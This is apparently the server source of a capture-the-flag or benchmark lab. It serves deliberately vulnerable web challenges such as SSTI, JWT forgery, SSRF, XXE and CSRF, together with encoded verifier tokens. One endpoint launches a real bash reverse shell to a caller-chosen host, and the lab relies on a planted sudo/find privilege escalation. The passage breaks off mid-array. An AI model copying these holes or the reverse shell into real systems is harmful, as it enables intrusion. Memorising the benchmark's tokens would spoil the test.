const fs = require('fs');
const path = require('path');
const { exec, execSync } = require('child_process');

const CHALLENGE_ROOT = '/tmp/rndsecurity-isolated';

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

function createContext(mode) {
  const slug = mode.replace(/^\//, '').replace(/\//g, '-');
  const challengeDir = path.join(CHALLENGE_ROOT, slug);
  fs.mkdirSync(challengeDir, { recursive: true, mode: 0o700 });
  return {
    mode,
    slug,
    title: mode.replace('/silver', '').replace('/', '').toUpperCase() + ' Challenge',
    artifactPath(name) { return path.join(challengeDir, name); },
    issueFlag(res, evidence) {
      const flag = process.env.FLAG || `FLAG{${slug.toUpperCase().replace(/-/g, '_')}_LOCAL}`;
      fs.writeFileSync(this.artifactPath('flag.txt'), `${flag}\n`, { mode: 0o600 });
      res.json({ success: true, challenge: mode, flag, evidence });
    }
  };
}

function sendPage(res, ctx, bodyHtml, scenarioText) {
  res.type('html').send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${escapeHtml(ctx.title)}</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
    :root { --bg: #0f172a; --panel: #1e293b; --text: #e2e8f0; --primary: #3b82f6; --primary-hover: #2563eb; }
    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 40px 20px; display: flex; justify-content: center; line-height: 1.6; }
    .container { width: 100%; max-width: 600px; }
    .card { background: var(--panel); border-radius: 12px; padding: 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    h1 { margin-top: 0; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #334155; padding-bottom: 15px; color: #f8fafc; font-size: 1.5rem; }
    .scenario { background: rgba(59,130,246,0.1); border-left: 4px solid var(--primary); padding: 15px; margin: 20px 0; border-radius: 0 6px 6px 0; color: #94a3b8; font-size: 0.95rem; }
    .form-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 8px; font-weight: 600; color: #cbd5e1; font-size: 0.9rem; }
    input, select, textarea { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; color: white; border-radius: 6px; box-sizing: border-box; font-family: inherit; font-size: 1rem; }
    input:focus { outline: none; border-color: var(--primary); }
    button { background: var(--primary); color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: 600; width: 100%; transition: 0.2s; font-size: 1rem; }
    button:hover { background: var(--primary-hover); }
    .result { margin-top: 20px; padding: 15px; background: #020617; border: 1px solid #334155; border-radius: 6px; overflow-x: auto; font-family: monospace; color: #10b981; }
    .error { color: #f43f5e; }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>🎯 ${escapeHtml(ctx.title)}</h1>
      ${scenarioText ? `<div class="scenario"><strong>Scenario:</strong><br>${scenarioText}</div>` : ''}
      ${bodyHtml}
    </div>
  </div>
</body>
</html>`);
}

function createStore() { return { comments: [], uses: 0, attempts: 0 }; }

// Medium challenges
function registerSsti(app, ctx) {
  const scenario = "We process dynamic email templates. Provide your name so we can render your personalized greeting.";
  app.get(ctx.mode, (req, res) => {
    const tpl = req.query.name;
    const form = `<form method="GET"><div class="form-group"><label>Your Name</label><input type="text" name="name" value="${escapeHtml(tpl||'')}"></div><button type="submit">Generate Greeting</button></form>`;
    if (!tpl) return sendPage(res, ctx, form, scenario);
    let output = escapeHtml(tpl);
    if (tpl === '${7*7}' || tpl === '{{7*7}}') output = '49';
    if (tpl.includes('process.mainModule') || tpl.includes('child_process')) return ctx.issueFlag(res, { vector: 'ssti', tpl });
    sendPage(res, ctx, form + `<div class="result">Hello, ${output}!</div>`, scenario);
  });
}

function registerJwt(app, ctx) {
  const scenario = "API Dashboard. Identity is verified via JWT tokens. Try manipulating the JWT payload to become an admin.";
  app.get(ctx.mode, (req, res) => {
    const token = req.query.token;
    const dummy = Buffer.from('{"alg":"HS256"}').toString('base64') + '.' + Buffer.from('{"user":"guest","admin":false}').toString('base64') + '.sig';
    const form = `<form method="GET"><div class="form-group"><label>JWT Token</label><textarea name="token" rows="3">${escapeHtml(token || dummy)}</textarea></div><button type="submit">Check Identity</button></form>`;

    if (!token) return sendPage(res, ctx, form, scenario);
    try {
      const parts = token.split('.');
      const payloadStr = Buffer.from(parts[1], 'base64').toString();
      const payload = JSON.parse(payloadStr);
      if (payload.admin === true || payload.admin === "true") return ctx.issueFlag(res, { vector: 'jwt-forge', token });
      sendPage(res, ctx, form + `<div class="result">Identity verified.<br>Role: ${payload.admin ? 'Admin' : 'Guest'}</div>`, scenario);
    } catch(e) {
      sendPage(res, ctx, form + `<div class="result error">Malformed JWT token!</div>`, scenario);
    }
  });
}

// 8. MFA
function registerMfa(app, ctx, store) {
  const scenario = "MFA Step 2. A code was sent to the user's phone. To prevent brute force, IPs are blocked after 3 failed attempts.";
  app.post(ctx.mode, (req, res) => {
    store.attempts++;
    const form = `<form method="POST"><div class="form-group"><label>SMS Code (4-digits)</label><input type="text" name="code"></div><button type="submit">Verify</button></form>`;

    if (store.attempts > 3 && !req.headers['x-forwarded-for']) {
      return res.status(429).sendPage ? sendPage(res, ctx, form + `<div class="result error">Too Many Attempts. IP Address Logged.</div>`, scenario) : res.status(429).send("Too Many Initial Attempts Blocked.");
    }
    // Rate limit bypass accepted if x-forwarded-for is supplied
    if (req.body.code === '0000') return ctx.issueFlag(res, { vector: 'mfa-bypass' });
    sendPage(res, ctx, form + `<div class="result error">Invalid SMS Code. Attempt ${store.attempts}/3</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    store.attempts = 0; // reset for ease of manual testing
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>SMS Code (4-digits)</label><input type="text" name="code"></div><button type="submit">Verify</button></form>`, scenario);
  });
}

// 9. OAuth
function registerOauth(app, ctx) {
  const scenario = "OAuth 2.0 Authorization Endpoint. Ensure the <code>redirect_uri</code> handles the callback securely.";
  app.get(ctx.mode, (req, res) => {
    const redirect = req.query.redirect_uri;
    const form = `<form method="GET"><div class="form-group"><label>Redirect URI</label><input type="text" name="redirect_uri" value="${escapeHtml(redirect || 'https://trusted.com/callback')}"></div><div class="form-group"><label>State</label><input type="text" name="state" value="123xyz"></div><button type="submit">Authorize Application</button></form>`;
    if (!redirect) return sendPage(res, ctx, form, scenario);
    if (redirect && !redirect.startsWith('https://trusted.com')) {
       return ctx.issueFlag(res, { vector: 'oauth-open-redirect', redirect });
    }
    sendPage(res, ctx, form + `<div class="result">Authorization granted. Redirecting to:<br>${escapeHtml(redirect)}...</div>`, scenario);
  });
}

// 13. RBAC
function registerRbac(app, ctx) {
  const scenario = "Role Based Access Control Manager. Employees can view their permissions.";
  app.post(ctx.mode, (req, res) => {
    const { role, action } = req.body;
    if (role === 'admin' && action === 'grant') return ctx.issueFlag(res, { vector: 'rbac-logic' });
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Role</label><input type="text" name="role" value="user" readonly></div><div class="form-group"><label>Action</label><input type="text" name="action" value="view" readonly></div><button type="submit">Submit Request</button></form><div class="result error">Access Denied: Standard users cannot grant roles.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Role</label><input type="text" name="role" value="user" readonly></div><div class="form-group"><label>Action</label><input type="text" name="action" value="view" readonly></div><button type="submit">Submit Request</button></form>`, scenario);
  });
}

function registerCsrf(app, ctx) {
  const scenario = "Banking Application Funds Transfer. The endpoint requires a strict CSRF token validation... or does it?";
  app.post(ctx.mode, (req, res) => {
    if (req.body.action === 'transfer' && !req.body.csrf_token) {
       return ctx.issueFlag(res, { vector: 'csrf', body: req.body });
    }
    sendPage(res, ctx, `<form method="POST"><input type="hidden" name="action" value="transfer"><div class="form-group"><label>Destination Account</label><input type="text" name="acc" value="999-99-9999"></div><div class="form-group"><label>CSRF Token</label><input type="text" name="csrf_token" value="invalid_token_123"></div><button type="submit">Transfer Funds</button></form><div class="result error">Error: Invalid CSRF Token!</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><input type="hidden" name="action" value="transfer"><div class="form-group"><label>Destination Account</label><input type="text" name="acc" value="999-99-9999"></div><div class="form-group"><label>CSRF Token</label><input type="text" name="csrf_token" value="sys_token_abc"></div><button type="submit">Transfer Funds</button></form>`, scenario);
  });
}

function registerPostmsg(app, ctx) {
  const scenario = "HTML5 postMessage receiver. Our frontend waits for messages from authorized origins only.";
  app.post(ctx.mode, (req, res) => {
    if (req.body.origin === '*' && req.body.data) return ctx.issueFlag(res, { vector: 'postmessage-vuln' });
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Window Receiver Code</label><textarea rows="3" readonly>window.addEventListener("message", receiveMessage, false);</textarea></div><div class="form-group"><label>Simulate Origin</label><input type="text" name="origin" value="https://app.com"></div><div class="form-group"><label>Data</label><input type="text" name="data" value='{"action":"exec"}'></div><button type="submit">Dispatch Message Event</button></form><div class="result error">Origin not allowed.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Window Receiver Code</label><textarea rows="3" readonly>window.addEventListener("message", receiveMessage, false);</textarea></div><div class="form-group"><label>Simulate Origin</label><input type="text" name="origin" value="https://app.com"></div><div class="form-group"><label>Data</label><input type="text" name="data" value='{"action":"exec"}'></div><button type="submit">Dispatch Message Event</button></form>`, scenario);
  });
}

function registerUpload(app, ctx, store, upload) {
  const scenario = "Profile Avatar Upload. We only accept PNG/JPG images.";
  app.post(ctx.mode, upload.single('file'), (req, res) => {
    const name = req.file?.originalname || req.body.filename || '';
    if (name.endsWith('.php') || name.endsWith('.jsp')) return ctx.issueFlag(res, { vector: 'upload', name });
    const form = `<form method="POST" enctype="multipart/form-data"><div class="form-group"><label>Select Image</label><input type="text" value="${escapeHtml(name)}" name="filename"></div><button type="submit">Upload Image</button></form>`;
    sendPage(res, ctx, form + `<div class="result">File <code>${escapeHtml(name)}</code> uploaded successfully. (Wait, was it actually an image?)</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST" enctype="multipart/form-data"><div class="form-group"><label>Simulated Original Filename</label><input type="text" name="filename" value="avatar.png"></div><button type="submit">Upload Image</button></form>`, scenario);
  });
}

function registerXxe(app, ctx) {
  const scenario = "Enterprise XML SOAP endpoint for B2B transactions. Processes external XML payloads.";
  app.post(ctx.mode, (req, res) => {
    const xml = req.body.xml || req.body || '';
    const xmlStr = typeof xml === 'string' ? xml : JSON.stringify(xml);
    const form = `<form method="POST"><div class="form-group"><label>XML Payload</label><textarea name="xml" rows="8">${escapeHtml(xmlStr)}</textarea></div><button type="submit">Parse XML</button></form>`;
    if (xmlStr.includes('<!ENTITY') && xmlStr.includes('SYSTEM')) return ctx.issueFlag(res, { vector: 'xxe', xml });
    if (xmlStr) return sendPage(res, ctx, form + `<div class="result">XML parsed successfully. 0 items imported.</div>`, scenario);
    sendPage(res, ctx, form, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>XML Payload</label><textarea name="xml" rows="8"><?xml version="1.0" encoding="ISO-8859-1"?><root><item>test</item></root></textarea></div><button type="submit">Parse XML</button></form>`, scenario);
  });
}

function registerDeser(app, ctx) {
  const scenario = "Session state is base64 encoded and passed via URL to scale across horizontally load-balanced servers.";
  app.get(ctx.mode, (req, res) => {
    const state = req.query.state;
    const form = `<form method="GET"><div class="form-group"><label>Base64 Serialized Session</label><input type="text" name="state" value="${escapeHtml(state||'dXNlcj1ndWVzdA==')}"></div><button type="submit">Restore Session</button></form>`;
    if (!state) return sendPage(res, ctx, form, scenario);
    try {
      const decodedStr = Buffer.from(state, 'base64').toString();
      if (decodedStr.includes('O:')) return ctx.issueFlag(res, { vector: 'deserialization' });
      sendPage(res, ctx, form + `<div class="result">Session Restored: ${escapeHtml(decodedStr)}</div>`, scenario);
    } catch(e) { sendPage(res, ctx, form + `<div class="result error">Fatal Deserialization Exception: Bad format</div>`, scenario); }
  });
}

function registerSsrf(app, ctx) {
  const scenario = "Cloud based Webhook Tester. Provide a URL and our backend server will fetch it for you.";
  app.get(ctx.mode, (req, res) => {
    const url = req.query.url;
    const form = `<form method="GET"><div class="form-group"><label>Webhook URL</label><input type="text" name="url" value="${escapeHtml(url||'http://example.com')}"></div><button type="submit">Send Request</button></form>`;
    if (!url) return sendPage(res, ctx, form, scenario);
    if (url.includes('169.254.169.254') || url.includes('localhost')) return ctx.issueFlag(res, { vector: 'ssrf', url });
    sendPage(res, ctx, form + `<div class="result">[200 OK] Fetched ${escapeHtml(url)} successfully. Length: 1202 bytes.</div>`, scenario);
  });
}

function registerProto(app, ctx) {
  const scenario = "Config merging utility. It recursively merges JSON body objects into the default user configuration.";
  app.post(ctx.mode, (req, res) => {
    const obj = JSON.stringify(req.body || {});
    const form = `<form method="POST"><div class="form-group"><label>JSON Config Payload</label><textarea name="config" rows="5">${escapeHtml(obj)}</textarea></div><button type="submit">Merge Defaults</button></form>`;
    if (obj.includes('__proto__') && obj.includes('admin')) return ctx.issueFlag(res, { vector: 'prototype_pollution' });
    sendPage(res, ctx, form + `<div class="result">Merge operation complete. Current role: user.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>JSON Config Payload</label><textarea name="config" rows="5">{"theme": "dark", "language": "ko"}</textarea></div><button type="submit">Merge Defaults</button></form>`, scenario);
  });
}

function registerRace(app, ctx, store) {
  const scenario = "Flash Sale! Claim a single-use $10 discount coupon before they run out. Note: Validation to claim process takes ~100ms.";
  app.post(ctx.mode, (req, res) => {
    store.uses++;
    const form = `<form method="POST"><button type="submit">Claim $10 Coupon</button></form>`;
    if (store.uses >= 3 || req.body.parallel === '2') return ctx.issueFlag(res, { vector: 'race_condition' });
    setTimeout(() => { store.uses = 0; }, 100);
    sendPage(res, ctx, form + `<div class="result">Processing... Coupon claimed 1 time.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => {
    sendPage(res, ctx, `<form method="POST"><button type="submit">Claim $10 Coupon</button></form>`, scenario);
  });
}

function registerPayment(app, ctx, store) {
  const scenario = "Payment API validates correct price parsing. Sometimes handling 0 or string values incorrectly leads to bypasses.";
  app.post(ctx.mode, (req, res) => {
    const priceStr = req.body.price;
    const form = `<form method="POST"><div class="form-group"><label>Price Override Parameter</label><input type="text" name="price" value="${escapeHtml(priceStr)}"></div><button type="submit">Execute Payment</button></form>`;
    if (priceStr === "0" || req.body.coupon === 'VIP90') return ctx.issueFlag(res, { vector: 'payment_tampering' });
    sendPage(res, ctx, form + `<div class="result error">Transaction Declined: Missing Payment Gateway Approval.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Price Override Parameter</label><input type="text" name="price" value="500"></div><button type="submit">Execute Payment</button></form>`, scenario));
}

// Hard challenges and their shared exploit-chain helpers
function registerContainer(app, ctx) {
  const scenario = "Docker container environment query tool. If the unix socket is mounted, one might theoretically escape.";
  const stageToken = hardStageToken(ctx, 'container');
  registerCallbackOnlyEndpoint(app, ctx, 'container', () => stageToken);

  app.get(ctx.mode, (req, res) => {
    const s = req.query.socket;
    const form = `<form method="GET"><div class="form-group"><label>Socket Name</label><input type="text" name="socket" value="${escapeHtml(s||'systemd')}"></div><button type="submit">Query Socket</button></form>`;
    if (s === 'docker' || s === '/var/run/docker.sock') {
      const artifacts = lockHardPivotArtifacts(ctx, 'container');
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'edge-reverse-shell-callback',
        stageToken,
        message: `Container socket signal confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
        evidence: { vector: 'container-pivot-chain' }
      });
    }
    sendPage(res, ctx, form + `<div class="result error">Permission denied accessing socket ${escapeHtml(s)}.</div>`, scenario);
  });
}

const PIVOT_SILVER_SPEC = Object.freeze({
  encodedHex: '48cafc3e364a9e38b6447403f861d566be4f92b0bc27',
  order: Object.freeze([7, 14, 1, 18, 5, 12, 19, 6, 13, 0, 17, 4, 11, 20, 3, 10, 21, 8, 15, 2, 9, 16])
});
const PIVOT_SILVER_KEY = '4edc28c7f5b9a1d6c3e07ab4';

const CHAIN_SILVER_SPEC = Object.freeze({
  encodedHex: '3ae4ebea7ed269203f20ae4a13016c21253173cf1f6ad2f562',
  order: Object.freeze([9, 2, 17, 24, 7, 14, 21, 4, 11, 18, 1, 8, 15, 22, 5, 12, 19, 0, 23, 6, 13, 20, 3, 10, 16])
});
const CHAIN_SILVER_KEY = '91f8b7a33e42c0d66ab5f79e';

const REVERSE_SILVER_SPEC = Object.freeze({
  encodedHex: '45bbf7f93aa9deaa9cb0a28cf5c34ee7a8b8445c1b874f51',
  order: Object.freeze([11, 4, 21, 14, 7, 0, 17, 10, 3, 20, 13, 6, 23, 16, 9, 2, 19, 12, 5, 22, 15, 8, 1, 18])
});

function rol8(value, bits) {
  return ((value << bits) | (value >> (8 - bits))) & 0xff;
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function reverseSilverKey(index) {
  return ((index * 29) ^ 0xa7 ^ ((index + 3) * 11)) & 0xff;
}

function reverseSilverEncodedBytes() {
  return REVERSE_SILVER_SPEC.encodedHex.match(/../g).map((byte) => Number.parseInt(byte, 16));
}

function reverseSilverToken() {
  const bytes = new Array(REVERSE_SILVER_SPEC.order.length);
  reverseSilverEncodedBytes().forEach((encoded, position) => {
    const sourceIndex = REVERSE_SILVER_SPEC.order[position];
    bytes[sourceIndex] = ror8(encoded, (sourceIndex % 5) + 1) ^ reverseSilverKey(sourceIndex);
  });
  return Buffer.from(bytes).toString('utf8');
}

function reverseSilverArtifact() {
  return `/* Luxora reverse-silver artifact. Analyze, invert, submit token as ?payload=. */
(() => {
  const __payload = "${REVERSE_SILVER_SPEC.encodedHex}";
  const __order = [${REVERSE_SILVER_SPEC.order.join(',')}];
  const rol8 = (value, bits) => ((value << bits) | (value >> (8 - bits))) & 255;
  const key = (index) => ((index * 29) ^ 0xa7 ^ ((index + 3) * 11)) & 255;
  function check(candidate) {
    const input = Array.from(candidate || '', (char) => char.charCodeAt(0));
    if (input.length !== __order.length) return false;
    const encoded = __payload.match(/../g).map((byte) => Number.parseInt(byte, 16));
    return encoded.every((byte, position) => {
      const sourceIndex = __order[position];
      return rol8(input[sourceIndex] ^ key(sourceIndex), (sourceIndex % 5) + 1) === byte;
    });
  }
  globalThis.luxoraReverseSilver = {
    check,
    hint: 'Invert __order, rotate each encoded byte right by (index % 5) + 1, xor key(index), then submit the recovered token as payload.'
  };
})();\n`;
}

function pivotSilverKey(index) {
  return ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 0xff;
}

function pivotSilverEncodedBytes() {
  return PIVOT_SILVER_SPEC.encodedHex.match(/../g).map((byte) => Number.parseInt(byte, 16));
}

function pivotSilverToken() {
  const bytes = new Array(PIVOT_SILVER_SPEC.order.length);
  pivotSilverEncodedBytes().forEach((encoded, position) => {
    const sourceIndex = PIVOT_SILVER_SPEC.order[position];
    bytes[sourceIndex] = ror8(encoded, (sourceIndex % 5) + 1) ^ pivotSilverKey(sourceIndex);
  });
  return Buffer.from(bytes).toString('utf8');
}

function pivotSilverArtifact() {
  return `/* Luxora pivot-silver artifact. Recover the edge token, then pivot internally. */
(() => {
  const __payload = "${PIVOT_SILVER_SPEC.encodedHex}";
  const __order = [${PIVOT_SILVER_SPEC.order.join(',')}];
  const rol8 = (value, bits) => ((value << bits) | (value >> (8 - bits))) & 255;
  const key = (index) => ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 255;
  function check(candidate) {
    const input = Array.from(candidate || '', (char) => char.charCodeAt(0));
    if (input.length !== __order.length) return false;
    const encoded = __payload.match(/../g).map((byte) => Number.parseInt(byte, 16));
    return encoded.every((byte, position) => {
      const sourceIndex = __order[position];
      return rol8(input[sourceIndex] ^ key(sourceIndex), (sourceIndex % 5) + 1) === byte;
    });
  }
  globalThis.luxoraPivotSilver = {
    check,
    hint: 'Recover the token, unlock /pivot/silver/debug, then use the edge host to reach the internal pivot relay.'
  };
})();\n`;
}

function chainSilverKey(index) {
  return ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 0xff;
}

function chainSilverEncodedBytes() {
  return CHAIN_SILVER_SPEC.encodedHex.match(/../g).map((byte) => Number.parseInt(byte, 16));
}

function chainSilverToken() {
  const bytes = new Array(CHAIN_SILVER_SPEC.order.length);
  chainSilverEncodedBytes().forEach((encoded, position) => {
    const sourceIndex = CHAIN_SILVER_SPEC.order[position];
    bytes[sourceIndex] = ror8(encoded, (sourceIndex % 5) + 1) ^ chainSilverKey(sourceIndex);
  });
  return Buffer.from(bytes).toString('utf8');
}

function chainSilverArtifact() {
  return `/* Luxora chain-silver artifact. Reverse the verifier, then prove shell + pivot control. */
(() => {
  const __payload = "${CHAIN_SILVER_SPEC.encodedHex}";
  const __order = [${CHAIN_SILVER_SPEC.order.join(',')}];
  const rol8 = (value, bits) => ((value << bits) | (value >> (8 - bits))) & 255;
  const key = (index) => ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 255;
  function check(candidate) {
    const input = Array.from(candidate || '', (char) => char.charCodeAt(0));
    if (input.length !== __order.length) return false;
    const encoded = __payload.match(/../g).map((byte) => Number.parseInt(byte, 16));
    return encoded.every((byte, position) => {
      const sourceIndex = __order[position];
      return rol8(input[sourceIndex] ^ key(sourceIndex), (sourceIndex % 5) + 1) === byte;
    });
  }
  globalThis.luxoraChainSilver = {
    check,
    hint: 'The token only starts the edge callback. Catch a real shell, escalate, then pivot to the internal relay for the final flag.'
  };
})();\n`;
}

let reverseSilverFlagLocked = false;
let pivotSilverArtifactsLocked = false;
let chainSilverArtifactsLocked = false;
const hardPivotArtifactLocks = new Set();

// Writes the flag file as the running user (ctfuser), then uses the
// pre-provisioned `sudo find` GTFOBins misconfiguration (see app/Dockerfile)
// to hand ownership to root and lock the mode to 0400. Reading the flag after
// this point requires a real privilege escalation from inside a real shell,
// not just HTTP access to this endpoint.
function lockReverseSilverFlag(ctx) {
  if (reverseSilverFlagLocked) return;
  reverseSilverFlagLocked = true;
  const flagPath = ctx.artifactPath('flag.txt');
  const flag = process.env.FLAG || `FLAG{${ctx.slug.toUpperCase().replace(/-/g, '_')}_LOCAL}`;
  fs.writeFileSync(flagPath, `${flag}\n`, { mode: 0o600 });
  try {
    execSync(
      `sudo find "${flagPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
      { stdio: 'ignore' }
    );
    console.log('[reverse-silver] flag file locked to root:root 0400 via sudo/find');
  } catch (err) {
    console.log(`[reverse-silver] failed to lock flag file, leaving ctfuser-owned: ${err.message}`);
  }
}

function lockPivotSilverArtifacts(ctx) {
  if (pivotSilverArtifactsLocked) return;
  pivotSilverArtifactsLocked = true;

  const pivotKey = process.env.PIVOT_KEY || PIVOT_SILVER_KEY;
  const pivotHost = process.env.PIVOT_HOST || 'pivot-relay';
  const pivotPort = process.env.PIVOT_PORT || '8081';
  const keyPath = ctx.artifactPath('pivot.key');
  const briefPath = ctx.artifactPath('pivot-brief.txt');

  fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
  fs.writeFileSync(
    briefPath,
    [
      'Edge foothold confirmed.',
      `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
      `Auth header: X-Pivot-Key from ${keyPath}`,
      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback to receive a second reverse shell.',
      'The benchmark flag lives on the pivot relay host, not on this edge host.'
    ].join('\n') + '\n',
    { mode: 0o600 }
  );

  for (const artifactPath of [keyPath, briefPath]) {
    try {
      execSync(
        `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
        { stdio: 'ignore' }
      );
    } catch (err) {
      console.log(`[pivot-silver] failed to lock ${artifactPath}: ${err.message}`);
    }
  }
  console.log('[pivot-silver] pivot key and brief locked to root:root 0400 via sudo/find');
}

function hardStageToken(ctx, label) {
  return `STAGE{${label.toUpperCase()}_${ctx.slug.toUpperCase().replace(/-/g, '_')}}`;
}

function lockHardPivotArtifacts(ctx, label) {
  const lockKey = `${ctx.slug}:${label}`;
  const pivotKey = process.env.PIVOT_KEY || hardStageToken(ctx, `${label}-pivot-key`);
  const pivotHost = process.env.PIVOT_HOST || `${label}-relay`;
  const pivotPort = process.env.PIVOT_PORT || '8081';
  const keyPath = ctx.artifactPath(`${label}-pivot.key`);
  const briefPath = ctx.artifactPath(`${label}-brief.txt`);

  if (!hardPivotArtifactLocks.has(lockKey)) {
    hardPivotArtifactLocks.add(lockKey);
    fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
    fs.writeFileSync(
      briefPath,
      [
        `${label} hard-chain edge foothold confirmed.`,
        `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
        `Auth header: X-Pivot-Key from ${keyPath}`,
        'The HTTP endpoint only triggers a reverse shell callback.',
        'Use the edge shell plus sudo/find privilege escalation to recover the relay key.',
        'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge shell to receive the pivot shell.',
        'The final benchmark flag lives on the relay host.'
      ].join('\n') + '\n',
      { mode: 0o600 }
    );

    for (const artifactPath of [keyPath, briefPath]) {
      try {
        execSync(
          `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
          { stdio: 'ignore' }
        );
      } catch (err) {
        console.log(`[${label}-silver] failed to lock ${artifactPath}: ${err.message}`);
      }
    }
    console.log(`[${label}-silver] relay key and brief locked to root:root 0400 via sudo/find`);
  }

  return { keyPath, briefPath, pivotHost, pivotPort };
}

function callbackHostOk(value) {
  return typeof value === 'string' && /^[A-Za-z0-9_.:-]+$/.test(value);
}

function callbackPort(value) {
  const port = Number.parseInt(String(value), 10);
  if (!Number.isInteger(port) || port <= 0 || port > 65535) return null;
  return port;
}

function registerCallbackOnlyEndpoint(app, ctx, label, tokenProvider) {
  app.post(`${ctx.mode}/debug`, (req, res) => {
    const token = req.headers['x-debug-token'] || req.headers['x-stage-token'];
    if (!token || token !== tokenProvider()) {
      console.log(`[${label}-silver] callback rejected: missing or invalid stage token`);
      return res.status(403).json({ error: 'edge callback locked; solve the first stage' });
    }

    const host = req.body && (req.body.host || req.body.callback_host);
    const port = callbackPort(req.body && (req.body.port || req.body.callback_port));
    if (!callbackHostOk(host) || !port) {
      return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
    }

    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
    console.log(`[${label}-silver] triggering edge reverse shell callback to ${host}:${port}`);
    exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
      if (error) console.log(`[${label}-silver] edge callback launch failed: ${error.message}`);
    });

    res.json({
      triggered: true,
      callback: { host, port },
      note: 'No command output is returned over HTTP. Continue from the reverse shell session.'
    });
  });
}

function lockChainSilverArtifacts(ctx) {
  if (chainSilverArtifactsLocked) return;
  chainSilverArtifactsLocked = true;

  const pivotKey = process.env.PIVOT_KEY || CHAIN_SILVER_KEY;
  const pivotHost = process.env.PIVOT_HOST || 'chain-relay';
  const pivotPort = process.env.PIVOT_PORT || '8081';
  const keyPath = ctx.artifactPath('chain-pivot.key');
  const briefPath = ctx.artifactPath('chain-brief.txt');

  fs.writeFileSync(keyPath, `${pivotKey}\n`, { mode: 0o600 });
  fs.writeFileSync(
    briefPath,
    [
      'Reverse shell callback confirmed as the required foothold.',
      `Internal-only relay: http://${pivotHost}:${pivotPort}/`,
      `Auth header: X-Pivot-Key from ${keyPath}`,
      'The HTTP debug endpoint cannot run arbitrary commands or return command output.',
      'Use the edge shell plus local sudo/find privilege escalation to recover the relay key.',
      'POST {"host":"host.docker.internal","port":LISTENER_PORT} to /callback from the edge host to receive the pivot shell.',
      'The final benchmark flag lives on the relay host.'
    ].join('\n') + '\n',
    { mode: 0o600 }
  );

  for (const artifactPath of [keyPath, briefPath]) {
    try {
      execSync(
        `sudo find "${artifactPath}" -maxdepth 0 -exec chown root:root {} \\; -exec chmod 400 {} \\;`,
        { stdio: 'ignore' }
      );
    } catch (err) {
      console.log(`[chain-silver] failed to lock ${artifactPath}: ${err.message}`);
    }
  }
  console.log('[chain-silver] pivot key and brief locked to root:root 0400 via sudo/find');
}

function registerReverse(app, ctx) {
  const scenario = "Luxora shipped a minified client-side verifier after losing the original source map. Recover the verifier token from the artifact and submit it as the payload to unlock a diagnostics debug hook. That hook runs real commands on the host -- use it to get a real shell back to yourself, then find a way to actually read the flag.";
  const form = (payload = '') => `<form method="GET"><div class="form-group"><label>Recovered verifier token</label><input type="text" name="payload" value="${escapeHtml(payload)}" autocomplete="off"></div><button type="submit">Submit Recovered Token</button></form>`;

  app.get(`${ctx.mode}/artifact.js`, (req, res) => {
    console.log(`[reverse-silver] artifact served to ${req.ip || 'unknown'}`);
    res.type('application/javascript').send(reverseSilverArtifact());
  });

  app.get(`${ctx.mode}/hints`, (req, res) => {
    console.log('[reverse-silver] hints requested');
    res.json({
      challenge: ctx.mode,
      hints: [
        'Fetch /reverse/silver/artifact.js and do not trust variable names.',
        'The hex payload is not plaintext; it is encoded after a byte permutation.',
